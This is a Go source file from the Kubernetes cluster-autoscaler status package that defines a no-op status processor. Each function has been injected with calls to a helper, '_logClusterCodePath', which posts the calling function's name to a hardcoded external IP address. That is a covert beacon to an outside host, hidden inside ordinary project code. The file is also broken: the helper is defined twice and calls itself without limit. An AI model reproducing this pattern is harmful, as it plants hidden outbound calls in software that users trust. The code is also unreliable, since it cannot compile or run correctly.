package status

import (
	"k8s.io/autoscaler/cluster-autoscaler/clusterstate"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/autoscaler/cluster-autoscaler/context"
	"time"
)

type AutoscalingStatusProcessor interface {
	Process(context *context.AutoscalingContext, csr *clusterstate.ClusterStateRegistry, now time.Time) error
	CleanUp()
}

func NewDefaultAutoscalingStatusProcessor() AutoscalingStatusProcessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &NoOpAutoscalingStatusProcessor{}
}

type NoOpAutoscalingStatusProcessor struct{}

func (p *NoOpAutoscalingStatusProcessor) Process(context *context.AutoscalingContext, csr *clusterstate.ClusterStateRegistry, now time.Time) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (p *NoOpAutoscalingStatusProcessor) CleanUp() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
